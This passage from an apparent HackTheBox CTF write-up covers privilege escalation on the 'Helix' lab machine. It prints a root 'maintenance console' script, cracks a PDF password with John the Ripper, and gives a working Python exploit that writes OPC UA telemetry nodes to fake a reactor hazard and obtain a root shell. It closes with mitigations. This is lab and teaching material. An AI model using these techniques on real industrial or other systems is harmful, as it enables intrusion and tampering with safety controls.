+<p><code>operator</code> can run <code>helix-maint-console</code> as root without a password. This pattern — a sudo-invokable &quot;break-glass&quot; console gated by an external state file rather than interactive credentials — mirrors how real safety-interlocked ICS consoles are often built: operators aren't expected to type a password mid-emergency, so authorization is instead tied to the plant's own safety state. That design only holds up if nothing but the trusted safety controller can ever write to that state. Reading the script shows exactly what it checks before granting access:</p>
+<pre><code class="lang-bash">cat /usr/local/sbin/helix-maint-console
+</code></pre>
+<pre><code class="lang-bash">#!/bin/bash
+set -euo pipefail
+
+FLAG=&quot;/opt/helix/state/maintenance_window&quot;
+
+read_until() { cat &quot;$FLAG&quot; 2&gt;/dev/null || true; }
+
+window_ok() {
+  [ -f &quot;$FLAG&quot; ] || return 1
+  local until_ts now
+  until_ts=&quot;$(read_until)&quot;
+  now=&quot;$(date +%s)&quot;
+  [[ &quot;$until_ts&quot; =~ ^[0-9]+$ ]] || return 1
+  [ &quot;$now&quot; -lt &quot;$until_ts&quot; ] || return 1
+  return 0
+}
+
+if ! window_ok; then
+  echo &quot;Maintenance window CLOSED.&quot;
+  exit 1
+fi
+
+until_ts=&quot;$(read_until)&quot;
+now=&quot;$(date +%s)&quot;
+remaining=$((until_ts-now))
+
+echo &quot;[+] Privileged maintenance access granted&quot;
+echo &quot;[!] Window expires in ${remaining} seconds&quot;
+echo &quot;[!] Session will be terminated automatically&quot;
+
+# Unique scope name
+SCOPE=&quot;helix-maint-$$&quot;
+
+# Launch an interactive root shell attached to THIS TTY, in its own systemd scope
+systemd-run --quiet --scope --unit=&quot;$SCOPE&quot; --property=KillMode=control-group --property=SendSIGHUP=yes \
+  /bin/bash -p -i
+
+# If systemd-run returns, the shell exited.
+exit 0
+</code></pre>
+<p><code>window_ok()</code> — a check against <code>/opt/helix/state/maintenance_window</code> containing a future Unix timestamp — is the only authorization check the script performs. If it passes, <code>systemd-run</code> unconditionally launches a root shell attached to the caller's TTY; nothing downstream re-verifies who requested it or why. Nothing in the script verifies who or what wrote that file, either — the file itself is the target.</p>
+<p>The home directory also holds two files of interest:</p>
+<pre><code class="lang-bash">ls
+</code></pre>
+<pre><code>'control systems diagram.png'  'Operator Control &amp; Safety Guide.pdf'   user.txt
+</code></pre>
+<pre><code class="lang-bash">scp -i id_rsa 'operator@helix.htb:/home/operator/control systems diagram.png' 'operator@helix.htb:/home/operator/Operator Control &amp; Safety Guide.pdf' .
+</code></pre>
+<pre><code>control systems diagram.png                                                                                                                                        100%  899KB 725.8KB/s   00:01    
+Operator Control &amp; Safety Guide.pdf                                                                                                                                100%   28KB  68.2KB/s   00:00
+</code></pre>
+<p>The PDF is password protected:</p>
+<img src="https://img.zirov.net/helix-htb/70070083194166424857.png" alt="PDF password prompt when opening the Operator Control &amp; Safety Guide" />
+<p>We extract a crackable hash and run it against <code>rockyou.txt</code>:</p>
+<pre><code class="lang-bash">pdf2john 'Operator Control &amp; Safety Guide.pdf' &gt; hash
+john --wordlist=/opt/lists/rockyou.txt hash
+</code></pre>
+<pre><code>Using default input encoding: UTF-8
+Loaded 1 password hash (PDF, PDF encrypted document [MD5-RC4 / SHA2-AES 32/64])
+Cost 1 (revision) is 6 for all loaded hashes
+Cost 2 (key length) is 256 for all loaded hashes
+Will run 4 OpenMP threads
+Press Ctrl-C to abort, or send SIGUSR1 to john process for status
+operator1        (?)     
+1g 0:00:00:39 DONE (2026-08-07 22:16) 0.02552g/s 6738p/s 6738c/s 6738C/s orpheo..olivia09
+Use the &quot;--show --format=PDF&quot; options to display all of the cracked passwords reliably
+Session completed
+</code></pre>
+<p><strong>Cracked password:</strong> <code>operator1</code></p>
+<p>The decrypted PDF reveals the critical pieces of internal documentation needed to force a maintenance window:</p>
+<ul>
+<li>An <strong>OPC UA</strong> endpoint: <code>opc.tcp://127.0.0.1:4840/helix/</code></li>
+<li>The reactor's documented hazard trip threshold: <strong>295 (Temperature)</strong> — the point at which the safety controller considers the reactor to be in a genuine hazardous state</li>
+<li>The maintenance procedure: setting <code>Mode = MAINTENANCE</code> while the reactor is above that threshold causes the safety controller to write a valid future timestamp into <code>/opt/helix/state/maintenance_window</code></li>
+</ul>
+<img src="https://img.zirov.net/helix-htb/93309908228774892921.png" alt="Decrypted PDF showing the OPC UA endpoint, hazard threshold, and maintenance procedure" />
+<h3>Privilege Escalation Vector</h3>
+<p><strong>Vulnerability:</strong> <code>helix-maint-console</code>'s only authorization check is the contents of <code>/opt/helix/state/maintenance_window</code>, a file meant to be written solely by the internal automated safety controller in response to genuine hazard conditions reported over OPC UA — an industrial control protocol used here to simulate reactor telemetry (temperature, pressure) and operating mode. The OPC UA server exposes writable nodes for values that should be read-only telemetry (<code>Temperature</code>, <code>Mode</code>, <code>TestOverride</code>). Writing directly to these nodes lets us simulate a genuine hazard: driving the simulated temperature above the documented 295 threshold while <code>Mode</code> is <code>MAINTENANCE</code> and <code>TestOverride</code> is enabled causes the safety controller to update the flag file itself, which <code>helix-maint-console</code> then blindly trusts to grant a root shell.</p>
+<p>We forward the OPC UA port over the existing SSH access:</p>
+<pre><code class="lang-bash">ssh -i id_rsa -L 4840:127.0.0.1:4840 operator@helix.htb -N
+</code></pre>
+<p>We install the OPC UA client library and enumerate the address space:</p>
+<pre><code class="lang-bash">pip install opcua --break-system-packages
+</code></pre>
+<pre><code class="lang-python">from opcua import Client
+from opcua import ua
+
+c = Client(&quot;opc.tcp://127.0.0.1:4840/helix/&quot;)
+c.connect()
+
+def browse(node, depth=0):
+    for child in node.get_children():
+        try:
+            name = child.get_browse_name().Name
+            nid = child.nodeid.to_string()
+            node_class = child.get_node_class()
+            val = child.get_value() if node_class == ua.NodeClass.Variable else None
+            print(f&quot;{'  '*depth}{name} [{nid}] = {val}&quot;)
+            browse(child, depth+1)
+        except:
+            pass
+
+browse(c.get_objects_node())
+c.disconnect()
+</code></pre>
+<p>Enumeration surfaces the writable nodes we need:</p>
+<pre><code>Temperature       = ns=2;i=4
+Pressure          = ns=2;i=5
+CalibrationOffset = ns=2;i=6
+TripActive        = ns=2;i=10
+Mode              = ns=2;i=12
+TestOverride      = ns=2;i=13
+</code></pre>
+<p><strong>In short:</strong> flip <code>Mode</code> to <code>MAINTENANCE</code>, arm <code>TestOverride</code>, push <code>Temperature</code> past the documented 295 threshold, then race to call <code>helix-maint-console</code> before the resulting window closes. The script below does exactly that, end to end, over the same OPC UA connection:</p>
+<p>We drive <code>Mode</code> into <code>MAINTENANCE</code>, enable <code>TestOverride</code>, and ramp <code>CalibrationOffset</code> — the input the simulated <code>Temperature</code> reading is derived from — until it crosses <strong>295</strong>, the exact hazard threshold documented in the cracked safety guide. Once the threshold trips, we immediately trigger <code>helix-maint-console</code> over SSH while the resulting maintenance window is open:</p>
+<pre><code class="lang-python">from opcua import Client
+import time, os
+
+c = Client(&quot;opc.tcp://127.0.0.1:4840/helix/&quot;)
+c.connect()
+c.get_node(&quot;ns=2;i=12&quot;).set_value(&quot;MAINTENANCE&quot;)
+c.get_node(&quot;ns=2;i=13&quot;).set_value(True)
+
+for i in range(1, 20):
+    c.get_node(&quot;ns=2;i=6&quot;).set_value(float(i))
+    if c.get_node(&quot;ns=2;i=4&quot;).get_value() &gt;= 295:  # 295 = documented hazard threshold
+        print(&quot;[+] Window OPEN&quot;)
+        break
+    time.sleep(2)
+
+c.disconnect()
+os.system(&quot;ssh -i id_rsa operator@helix.htb 'sudo /usr/local/sbin/helix-maint-console'&quot;)
+</code></pre>
+<pre><code class="lang-bash">python3 root.py
+</code></pre>
+<pre><code>[+] Window OPEN
+[+] Privileged maintenance access granted
+[!] Window expires in 116 seconds
+[!] Session will be terminated automatically
+bash: cannot set terminal process group (74136): Inappropriate ioctl for device
+bash: no job control in this shell
+root@helix:/home/operator# whoami
+whoami
+root
+root@helix:/home/operator#
+</code></pre>
+<h2>Post Exploitation</h2>
+<pre><code class="lang-bash">hostname &amp;&amp; whoami &amp;&amp; ip addr &amp;&amp; cat root.txt
+</code></pre>
+<pre><code>helix
+root
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether a2:de:ad:be:ce:49 brd ff:ff:ff:ff:ff:ff
+    altname enp3s0
+    altname ens160
+    inet 10.129.245.123/16 brd 10.129.255.255 scope global dynamic eth0
+       valid_lft 2397sec preferred_lft 2397sec
+    inet6 dead:beef::a0de:adff:febe:ce49/64 scope global dynamic mngtmpaddr 
+       valid_lft 86393sec preferred_lft 14393sec
+    inet6 fe80::a0de:adff:febe:ce49/64 scope link 
+       valid_lft forever preferred_lft forever
+583ad9267c67f992499a0b57e212****
+</code></pre>
+<h2>Mitigations</h2>
+<p>Each vulnerability in this chain has a straightforward remediation. Addressing any single one of them would have broken the attack at that stage.</p>
+<p><strong>Patch Apache NiFi.</strong> Upgrade past version 1.21.0 to a release that addresses <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-34468" target="_blank" rel="noopener noreferrer">CVE-2023-34468</a>, or restrict which JDBC drivers and connection string parameters the <code>DBCPConnectionPool</code> service is allowed to use. <code>RUNSCRIPT</code>/<code>CREATE ALIAS</code> style init parameters should never be reachable from a JDBC URL configurable through the UI.</p>
+<p><strong>Restrict discovery of internal virtual hosts.</strong> <code>flow.helix.htb</code> was only reachable by brute-forcing the <code>Host</code> header; management interfaces like NiFi should sit behind VPN/network-layer restrictions rather than relying on an un-guessable hostname.</p>
+<p><strong>Never leave credential material in support bundles or diagnostic exports.</strong> The leaked <code>operator</code> SSH key should have been redacted or excluded from the NiFi support-bundle export process. Diagnostic archives should be treated as sensitive and access-controlled the same as backups.</p>
+<p><strong>Enforce strong, unique passwords on protected documents.</strong> The PDF's password (<code>operator1</code>) was trivially crackable with a common wordlist. Sensitive operational documentation should be encrypted with a strong, unique passphrase or, better, stored in an access-controlled document management system instead of a password-protected file.</p>
+<p><strong>Close the gap between OPC UA telemetry and the privileged console's trust model.</strong> The root cause here is one chain, not two independent flaws, so it needs one coordinated fix: (1) lock down the OPC UA server so <code>Temperature</code>, <code>Mode</code>, and <code>TestOverride</code> are writable only by the authorized control system, via OPC UA security policies (signing/encryption) and node-level ACLs; and (2) stop letting <code>helix-maint-console</code> treat <code>/opt/helix/state/maintenance_window</code> as an implicit trust anchor — the safety controller that writes it and the console that reads it should cryptographically sign or otherwise authenticate the grant, so that even a compromised or spoofed telemetry source can't forge a maintenance window on its own.</p>
+<hr />
+<p><strong>Tools used:</strong> <a href="https://nmap.org/" target="_blank" rel="noopener noreferrer">Nmap</a> · <a href="https://github.com/ffuf/ffuf" target="_blank" rel="noopener noreferrer">ffuf</a> · <a href="https://nifi.apache.org/" target="_blank" rel="noopener noreferrer">Apache NiFi</a> · <a href="https://github.com/brightio/penelope" target="_blank" rel="noopener noreferrer">penelope</a> · <a href="https://github.com/openwall/john" target="_blank" rel="noopener noreferrer">pdf2john / John the Ripper</a> · <a href="https://github.com/FreeOpcUa/python-opcua" target="_blank" rel="noopener noreferrer">python-opcua</a> · <a href="https://www.openssh.com/" target="_blank" rel="noopener noreferrer">OpenSSH</a></p>
+
+      </div>
+    </article>
+    <aside class="col-sidebar"></aside>
+  </main>
+<footer class="site-footer">
+  <div class="footer-main">
+    <div class="footer-col">
+      <div class="footer-col-label">z1rov</div>
+      <div class="footer-brand">
+        <svg style="width:22px;height:23px;flex-shrink:0;display:block;" viewBox="-0.5 -0.5 262 270" xmlns="http://www.w3.org/2000/svg">
+          <path fill="#c82525" d="M -0.5,-0.5 C 86.8333,-0.5 174.167,-0.5 261.5,-0.5C 261.5,89.5 261.5,179.5 261.5,269.5C 174.167,269.5 86.8333,269.5 -0.5,269.5C -0.5,179.5 -0.5,89.5 -0.5,-0.5 Z"/>
+          <path fill="#f9f8f8" d="M 121.5,149.5 C 120.244,149.461 119.244,149.961 118.5,151C 143.831,151.5 169.164,151.667 194.5,151.5C 194.5,159.167 194.5,166.833 194.5,174.5C 151.167,174.5 107.833,174.5 64.5,174.5C 64.169,166.472 64.5023,158.472 65.5,150.5C 90.1104,140.298 114.777,130.298 139.5,120.5C 140.289,120.217 140.956,119.717 141.5,119C 115.835,118.5 90.1688,118.333 64.5,118.5C 64.5,110.833 64.5,103.167 64.5,95.5C 108.167,95.5 151.833,95.5 195.5,95.5C 195.831,103.528 195.498,111.528 194.5,119.5C 170.143,129.506 145.809,139.506 121.5,149.5 Z"/>
+        </svg>
+        <span class="footer-brand-text">z1ro<em>v</em></span>
+      </div>
+      <p class="footer-tagline">CTF writeups · malware analysis · pentesting<br>offensive research · competitive programmer at heart.</p>
+      <a href="https://buymeacoffee.com/z1rov" target="_blank" rel="noopener noreferrer" class="footer-coffee">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8h1a4 4 0 0 1 0 8h-1"/><path d="M2 8h16v9a4 4 0 0 1-4 4H6a4 4 0 0 1-4-4V8z"/><line x1="6" y1="1" x2="6" y2="4"/><line x1="10" y1="1" x2="10" y2="4"/><line x1="14" y1="1" x2="14" y2="4"/></svg>
+        <div class="footer-coffee-text">
+          <span class="footer-coffee-label">Support the work</span>
+          <span class="footer-coffee-sub">Buy me a coffee</span>
+        </div>
+        <svg class="footer-coffee-arr" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><polyline points="9 18 15 12 9 6"/></svg>
+      </a>
+    </div>
+    <div class="footer-col footer-col-connect">
+      <div class="footer-col-label">Connect</div>
+      <div class="footer-socials">
+        <a href="https://github.com/z1rov" target="_blank" rel="noopener" class="footer-soc">
+          <svg fill="currentColor" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z" clip-rule="evenodd"/></svg>
+          GitHub
+        </a>
+        <a href="https://www.linkedin.com/in/fabian-g-huamani" target="_blank" rel="noopener" class="footer-soc">
+          <svg fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452z"/></svg>
+          LinkedIn
+        </a>
+        <a href="https://profile.hackthebox.com/profile/019c52fc-d8cf-7339-9385-c0d96f6f7efb" target="_blank" rel="noopener" class="footer-soc">
+          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M11.996 0a1.119 1.119 0 0 0-.057.003.9.9 0 0 0-.236.05.907.907 0 0 0-.165.079L1.936 5.675a.889.889 0 0 0-.445.77v11.111a.889.889 0 0 0 .47.784l9.598 5.541.054.029v.002a.857.857 0 0 0 .083.035l.012.004c.028.01.056.018.085.026.01.001.011.003.016.004a.93.93 0 0 0 .296.015.683.683 0 0 0 .086-.015c.01 0 .011-.002.016-.004a.94.94 0 0 0 .085-.026l.012-.004a.882.882 0 0 0 .083-.035v-.002a1.086 1.086 0 0 0 .054-.029l9.599-5.541a.889.889 0 0 0 .469-.784V6.48l-.001-.026v-.008a.889.889 0 0 0-.312-.676l-.029-.026c0-.002-.01-.005-.01-.007a.899.899 0 0 0-.107-.07L12.453.127A.887.887 0 0 0 11.99 0zm.01 2.253c.072 0 .144.019.209.056l6.537 3.774a.418.418 0 0 1 0 .726l-6.537 3.774a.418.418 0 0 1-.418 0L5.26 6.807a.418.418 0 0 1 0-.726l6.537-3.774a.42.42 0 0 1 .209-.056zm-8.08 6.458a.414.414 0 0 1 .215.057l6.526 3.766a.417.417 0 0 1 .208.361v7.533a.417.417 0 0 1-.626.361l-6.523-3.766a.417.417 0 0 1-.209-.362V9.13c0-.261.196-.414.41-.418zm16.16 0c.215.004.41.177.41.418v7.532a.42.42 0 0 1-.208.362l-6.526 3.766a.417.417 0 0 1-.626-.361v-7.533c0-.149.08-.286.209-.36l6.523-3.767a.415.415 0 0 1 .216-.057z"/></svg>
+          HackTheBox
+        </a>
+        <a href="https://leetcode.com/u/z1rov/" target="_blank" rel="noopener" class="footer-soc">
+          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M13.483 0a1.374 1.374 0 0 0-.961.438L7.116 6.226l-3.854 4.126a5.266 5.266 0 0 0-1.209 2.104 5.35 5.35 0 0 0-.125.513 5.527 5.527 0 0 0 .062 2.362 5.83 5.83 0 0 0 .349 1.017 5.938 5.938 0 0 0 1.271 1.818l4.277 4.193.039.038c2.248 2.165 5.852 2.133 8.063-.074l2.396-2.392c.54-.54.54-1.414.003-1.955a1.378 1.378 0 0 0-1.951-.003l-2.396 2.392a3.021 3.021 0 0 1-4.205.038l-.02-.019-4.276-4.193c-.652-.64-.972-1.469-.948-2.263a2.68 2.68 0 0 1 .066-.523 2.545 2.545 0 0 1 .619-1.164L9.13 8.114c1.058-1.134 3.204-1.27 4.43-.278l3.501 2.831c.593.48 1.461.387 1.94-.207a1.384 1.384 0 0 0-.207-1.943l-3.5-2.831c-.8-.647-1.766-1.045-2.774-1.202l2.015-2.158A1.384 1.384 0 0 0 13.483 0zm-2.866 12.815a1.38 1.38 0 0 0-1.38 1.382 1.38 1.38 0 0 0 1.38 1.382H20.79a1.38 1.38 0 0 0 1.38-1.382 1.38 1.38 0 0 0-1.38-1.382z"/></svg>
+          LeetCode
+        </a>
+        <a href="https://codeforces.com/profile/z1rov" target="_blank" rel="noopener" class="footer-soc">
+          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M4.5 7.5C5.328 7.5 6 8.172 6 9v10.5c0 .828-.672 1.5-1.5 1.5h-3C.672 21 0 20.328 0 19.5V9c0-.828.672-1.5 1.5-1.5h3zm9-4.5c.828 0 1.5.672 1.5 1.5v15c0 .828-.672 1.5-1.5 1.5h-3c-.828 0-1.5-.672-1.5-1.5v-15c0-.828.672-1.5 1.5-1.5h3zm9 7.5c.828 0 1.5.672 1.5 1.5v7.5c0 .828-.672 1.5-1.5 1.5h-3c-.828 0-1.5-.672-1.5-1.5V12c0-.828.672-1.5 1.5-1.5h3z"/></svg>
+          Codeforces
+        </a>
+        <a href="https://discord.gg/4nnsYWjbUk" target="_blank" rel="noopener" class="footer-soc">
+          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057c.002.022.015.043.031.051a19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/></svg>
+          Discord
+        </a>
+      </div>
+    </div>
+  </div>
+  <div class="footer-bar">
+    <span class="footer-copy">© 2026 <em>z1rov</em> · All rights reserved.</span>
+    <div class="footer-bar-links">
+      <a href="#" class="footer-bar-link">Privacy</a>
+      <span class="footer-bar-sep">·</span>
+      <a href="#" class="footer-bar-link">RSS</a>
+      <span class="footer-bar-sep">·</span>
+      <a href="../page/about.html" class="footer-bar-link">About</a>
+    </div>
+  </div>
+</footer>
+  <script src="/js/app.js"></script>
+  <script src="/js/post.js"></script>
+  <script src="/js/search.js"></script>
+  <script src="/js/analytics.js"></script>
+  <script src="/js/collapse.js"></script>
+</body>
+</html>
